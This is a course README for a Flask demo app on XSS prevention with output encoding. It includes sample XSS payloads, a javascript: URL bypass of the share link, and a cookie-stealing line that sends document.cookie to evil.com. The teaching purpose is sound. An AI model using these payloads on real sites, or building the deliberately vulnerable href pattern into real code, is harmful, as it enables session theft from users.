# Output Encoding Demo - TerrierSearch

A demonstration of XSS prevention using output encoding for EC521 Introduction to Cybersecurity.

## Overview

This demo shows how **output encoding** prevents basic XSS attacks by escaping HTML entities. However, it also demonstrates the **limitations** of relying on encoding alone.

**This is Step 2 of 3** in the XSS demo progression:
1. **Unsanitized** (port 5004): No protection - vulnerable
2. **Encoded** (port 5005): Output encoding only (this demo)
3. **CSP + HttpOnly** (port 5006): Full protection

## Learning Objectives

- Understand how output encoding prevents XSS
- Learn the limitations of encoding-only protection
- Recognize why defense-in-depth is important

## Setup

### Requirements

- Python 3.7+
- Flask

### Installation

```bash
pip install -r xss-encoded-requirements.txt
```

### Running the App

```bash
python xss-encoded-app.py
```

Visit `http://localhost:5005` in your browser.

## How Output Encoding Works

User input is HTML-escaped before rendering:

| Input | Encoded Output |
|-------|----------------|
| `<script>` | `&lt;script&gt;` |
| `<img>` | `&lt;img&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

The browser displays these as text instead of interpreting them as HTML.

## Try These Attacks

### Attacks That Are Blocked

| Payload | Result |
|---------|--------|
| `<script>alert('XSS')</script>` | Displayed as text ✓ |
| `<img src=x onerror=alert('XSS')>` | Displayed as text ✓ |

**Encoding works for HTML context!** But...

### Attack That BYPASSES Encoding

The "Share this search" link puts your query in an `href` attribute:

```html
<a href="{{ query }}">Share this search</a>
```

**Try this:**
```
javascript:alert(document.cookie)
```

Then click "Share this search" - **the JavaScript executes!**

This works because `javascript:` contains no characters that HTML encoding escapes (`< > " ' &`), so it passes through unchanged.

## Limitations of Encoding Alone

### 1. Context Matters

HTML encoding doesn't protect all contexts:

```html
<!-- HTML context - encoding works -->
<p>{{ user_input }}</p>

<!-- JavaScript context - encoding NOT enough! -->
<script>var x = "{{ user_input }}";</script>

<!-- URL context - needs URL encoding -->
<a href="{{ user_input }}">Click</a>
```

### 2. Developer Error

One forgotten `| safe` breaks everything:

```python
# SAFE
{{ query }}

# VULNERABLE - one mistake undoes all protection
{{ query | safe }}
```

### 3. Cookie Still Exposed

This demo does NOT use HttpOnly cookies. If encoding ever fails:

```javascript
// Attacker could steal the cookie
document.location = 'http://evil.com/?c=' + document.cookie
```

### 4. No Safety Net

If a new attack vector bypasses encoding, there's no backup protection.

## Files

| File | Description |
|------|-------------|
| `xss-encoded-app.py` | Flask app with output encoding only |
| `xss-encoded-requirements.txt` | Python dependencies |
| `xss-encoded-README.md` | This documentation |

## Comparison

| Feature | Unsanitized | Encoded | CSP+HttpOnly |
|---------|-------------|---------|--------------|
| Output Encoding | ❌ | ✅ | ✅ |
| CSP Header | ❌ | ❌ | ✅ |
| HttpOnly Cookie | ❌ | ❌ | ✅ |
| `<script>` blocked | ❌ | ✅ | ✅ |
| Event handlers blocked | ❌ | ✅ | ✅ |
| `javascript:` URLs blocked | ❌ | ❌ | ✅ |
| Cookie protected | ❌ | ❌ | ✅ |

**Next Step:** See the CSP+HttpOnly version (port 5006) for full protection.

## All Demos in This Repository

| Demo | Port | Description |
|------|------|-------------|
| Cookie Security | 5000 | Cookie manipulation attack |
| SQL Injection | 5001 | Classic SQL injection in login form |
| Blind SQL Injection | 5002 | Boolean-based blind SQL injection |
| Secure SQL | 5003 | SQL injection prevention with prepared statements |
| Reflected XSS | 5004 | Cross-site scripting via search (vulnerable) |
| **XSS Encoded** | 5005 | Output encoding only (this demo) |
| XSS + CSP | 5006 | Full protection with CSP |

## License

Educational use only - EC521 Boston University
